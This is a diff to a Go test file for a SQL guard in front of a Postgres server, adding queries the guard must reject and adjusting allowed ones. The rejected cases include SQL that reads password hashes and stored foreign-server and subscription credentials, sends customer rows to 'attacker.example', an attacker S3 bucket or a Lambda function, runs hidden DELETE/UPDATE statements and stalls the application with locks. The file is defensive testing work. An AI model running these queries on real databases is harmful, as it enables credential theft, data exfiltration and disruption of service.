@@ -12,8 +12,9 @@ package guardtest
 //	[crystaldba] https://github.com/crystaldba/postgres-mcp/issues/178
 //	[v1]         bypasses of this server's v1 first-word blocklist
 //	[lexer]      statement smuggling past a lexer that is not Postgres's own
+//	[redteam]    bypasses of v2 confirmed by red-team runs
+//	[review]     gaps in v2 found by code review
 //	[policy]     the guard's own rules
-//	[redteam]    bypasses found by this server's red-team review
 
 // Case is SQL the guard must reject. Want is part of the reason, naming the
 // statement type or function where there is one.
@@ -256,6 +257,40 @@ var Rejected = []Case{
 	// [policy] Called as a field: Postgres reads x.pg_current_logfile as the call.
 	{`SELECT ('stderr'::text).pg_current_logfile`, "function pg_current_logfile"},
 
+	// --- Denied relations read by name, with no reference to check ---
+
+	// [review] table_to_xml takes a regclass: it returned pg_hba.conf as the superuser.
+	{`SELECT table_to_xml('pg_catalog.pg_hba_file_rules', true, false, '')`, "table_to_xml"},
+	// [review] Its sibling, for postgresql.conf with its paths.
+	{`SELECT table_to_xml_and_xmlschema('pg_file_settings', true, false, '')`, "table_to_xml_and_xmlschema"},
+	// [review] xpath() extracts the whole document, past the inline output limit.
+	{`SELECT xpath('//auth_method/text()', table_to_xml('pg_hba_file_rules', true, false, ''))`, "table_to_xml"},
+	// [review] xml2's xpath_table builds and runs SQL from its text arguments.
+	{`SELECT * FROM xpath_table('k','d','pg_hba_file_rules','/x','true') AS t(k int, v text)`, "xpath_table"},
+	// [policy] pageinspect returns a relation's raw pages, its rows included.
+	{`SELECT encode(get_raw_page('pg_authid', 0), 'escape')`, "get_raw_page"},
+
+	// --- Credentials in system catalogs and views ---
+	// A superuser connection, which role_check warn admits, reads most of
+	// them; the user-mapping views show a mapped role its own passwords.
+
+	// [review] SCRAM or MD5 password verifiers.
+	{`SELECT rolname, rolpassword FROM pg_authid`, "pg_authid"},
+	// [review] The same, joined in.
+	{`SELECT r.rolname FROM pg_roles r JOIN pg_catalog.pg_authid a ON a.oid = r.oid WHERE a.rolpassword IS NOT NULL`, "pg_authid"},
+	// [review] The same, as a view.
+	{`SELECT usename, passwd FROM pg_shadow`, "pg_shadow"},
+	// [review] Foreign-server passwords.
+	{`SELECT umuser, umoptions FROM pg_user_mapping`, "pg_user_mapping"},
+	// [review] The same, shown to the mapped role itself.
+	{`SELECT srvname, usename, umoptions FROM pg_user_mappings`, "pg_user_mappings"},
+	// [policy] information_schema's view of them, likewise.
+	{`SELECT option_name, option_value FROM information_schema.user_mapping_options`, "user_mapping_options"},
+	// [policy] information_schema's base view of them.
+	{`SELECT umoptions FROM information_schema._pg_user_mappings`, "_pg_user_mappings"},
+	// [review] Subscription connection strings, passwords included.
+	{`SELECT subname, subconninfo FROM pg_subscription`, "pg_subscription"},
+
 	// --- Denied functions: v1 bypasses and spellings ---
 
 	// [v1] query_to_xml runs the SQL string it is given.
@@ -367,8 +402,6 @@ var Rejected = []Case{
 	{`SELECT * FROM pg_logical_slot_get_changes('s', NULL, NULL)`, "pg_logical_slot_get_changes"},
 	// [redteam] pg_log_*: writes WAL, which READ ONLY does not stop and rollback does not undo.
 	{`SELECT pg_log_standby_snapshot()`, "pg_log_standby_snapshot"},
-	// [policy] pg_log_*: makes another backend write to the server log.
-	{`SELECT pg_log_backend_memory_contexts(pg_backend_pid())`, "pg_log_backend_memory_contexts"},
 	// [policy] heap_force_*: pg_surgery deletes a row in place, which READ ONLY and the rollback do not stop.
 	{`SELECT heap_force_kill('app.orders'::regclass, ARRAY['(0,1)']::tid[])`, "heap_force_kill"},
 	// [policy] heap_force_*: freezes a row in place.
@@ -391,6 +424,11 @@ var Rejected = []Case{
 	{`SELECT pg_terminate_backend(pid) FROM pg_stat_activity`, "pg_terminate_backend"},
 	// [policy] Signals another session.
 	{`SELECT pg_cancel_backend(pid) FROM pg_stat_activity`, "pg_cancel_backend"},
+	// [redteam] Signals another backend to dump its memory contexts to the
+	// server log, outside the caller's statement_timeout.
+	{`SELECT pg_log_backend_memory_contexts(1)`, "pg_log_backend_memory_contexts"},
+	// [redteam] Every other backend at once, the log-amplification form.
+	{`SELECT pg_log_backend_memory_contexts(pid) FROM pg_stat_activity WHERE pid <> pg_backend_pid()`, "pg_log_backend_memory_contexts"},
 	// [policy] Server process control.
 	{`SELECT pg_reload_conf()`, "pg_reload_conf"},
 	// [policy] Server process control.
@@ -407,6 +445,18 @@ var Rejected = []Case{
 	{`SELECT "NET"."HTTP_GET"('https://attacker.example/')`, "net.http_get"},
 	// [policy] pg_net, a name not on any list.
 	{`SELECT net._encode_url_with_params_array('https://attacker.example/', '{}')`, "net._encode_url_with_params_array"},
+	// [review] RDS aws_s3: runs its SQL string and sends the rows to S3.
+	{`SELECT * FROM aws_s3.query_export_to_s3('SELECT * FROM app.customers', aws_commons.create_s3_uri('attacker-bucket', 'c.csv', 'us-east-1'))`, "aws_s3.query_export_to_s3"},
+	// [policy] RDS aws_s3: loads an S3 file into a table.
+	{`SELECT aws_s3.table_import_from_s3('app.orders', '', '(format csv)', 'bucket', 'o.csv', 'us-east-1')`, "aws_s3.table_import_from_s3"},
+	// [review] RDS aws_lambda: sends rows to a Lambda function, in any account.
+	{`SELECT * FROM aws_lambda.invoke('arn:aws:lambda:us-east-1:000000000000:function:f', (SELECT json_agg(c) FROM app.customers c))`, "aws_lambda.invoke"},
+	// [policy] aws_lambda, quoted upper case.
+	{`SELECT "AWS_LAMBDA"."INVOKE"('f', '{}'::json)`, "aws_lambda.invoke"},
+	// [review] pg_background runs its SQL string in a transaction of its own.
+	{`SELECT pg_background_launch('DELETE FROM app.orders')`, "pg_background_launch"},
+	// [review] And returns that statement's result.
+	{`SELECT * FROM pg_background_result(pg_background_launch('UPDATE app.orders SET status = ''paid''')) AS (r text)`, "pg_background_result"},
 	// [policy] pgsql-http, in any schema.
 	{`SELECT http(('GET', 'https://attacker.example/', NULL, NULL, NULL)::http_request)`, "function http "},
 	// [policy] pgsql-http.
@@ -447,6 +497,18 @@ var Rejected = []Case{
 	{`SELECT * FROM crosstab('SELECT 1, 2, 3') AS ct(a int, b int)`, "crosstab"},
 	// [policy] tablefunc's connectby builds SQL from its text arguments.
 	{`SELECT * FROM connectby('app.tree', 'id', 'parent_id', '1', 0) AS t(id int, parent_id int, level int)`, "connectby"},
+
+	// --- Denied functions: locks the application waits on ---
+
+	// [review] A transaction lock on the application's own key, read from
+	// pg_locks and held until statement_timeout, stalls its job queue.
+	{`SELECT pg_try_advisory_xact_lock(classid::int, objid::int), pg_sleep(29) FROM pg_locks WHERE locktype = 'advisory'`, "pg_try_advisory_xact_lock"},
+	// [review] The blocking transaction lock.
+	{`SELECT pg_advisory_xact_lock(42)`, "pg_advisory_xact_lock"},
+	// [review] Its shared variant.
+	{`SELECT pg_advisory_xact_lock_shared(1, 2)`, "pg_advisory_xact_lock_shared"},
+	// [review] The non-blocking shared variant.
+	{`SELECT pg_try_advisory_xact_lock_shared(42)`, "pg_try_advisory_xact_lock_shared"},
 
 	// --- Denied functions: state the rollback does not undo ---
 
@@ -553,14 +615,22 @@ var Allowed = []string{
 	`SELECT netmask(last_ip) FROM app.customers`,
 	`SELECT set_byte('\x00'::bytea, 0, 1), current_setting('statement_timeout')`,
 	`SELECT to_tsvector('english', message) FROM app.audit_log`,
+	`SELECT xmlelement(name total, sum(total)), xpath('/a/text()', '<a>1</a>'::xml) FROM app.orders`,
 	`SELECT pg_size_pretty(pg_total_relation_size('app.orders')), pg_backend_pid()`,
 	`SELECT n.nspname FROM pg_catalog.pg_namespace n`,
-	`SELECT pg_advisory_xact_lock(42), pg_try_advisory_xact_lock(43), pg_advisory_unlock(44)`,
+	`SELECT pg_advisory_unlock(44), pg_advisory_unlock_shared(45), pg_advisory_unlock_all()`,
 	`SELECT relname, seq_scan FROM pg_stat_user_tables`,
 	`SELECT pg_is_wal_replay_paused(), pg_lsn('0/16B3748'), name FROM pg_settings`,
 	// pg_settings (current GUC values, like SHOW) stays allowed; only the
 	// views that return raw config-file contents are denied.
 	`SELECT name, setting, unit FROM pg_settings WHERE name = 'statement_timeout'`,
+	// Function prefixes do not apply to relations: pg_replication_ is denied
+	// as a function prefix only.
+	`SELECT slot_name, active FROM pg_replication_slots`,
+	// Views that mask passwords, and subscription status without conninfo.
+	`SELECT rolname, rolsuper, rolpassword FROM pg_roles`,
+	`SELECT usename, passwd FROM pg_catalog.pg_user`,
+	`SELECT subname, pid FROM pg_stat_subscription`,
 	`SELECT net.id FROM app.events AS net`,
 	`SELECT "dblink" FROM (SELECT 1 AS "dblink") s`,
 	`SELECT 'São Paulo' AS cidade`,
